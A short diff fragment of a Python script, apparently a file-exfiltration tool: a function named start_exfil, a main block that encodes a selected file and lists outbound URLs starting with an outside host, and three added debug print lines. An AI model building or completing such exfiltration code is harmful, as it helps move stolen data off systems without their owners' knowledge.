@@ -29,6 +29,9 @@ def start_exfil(binary_data):
 
 
 if __name__ == '__main__':
+    print(selected_file)
+    data = encode(selected_file)
+    print(data)
     cipher = encode(selected_file)
     urls = []
     urls.append("http://level216.lot3ch.com") # Begin message
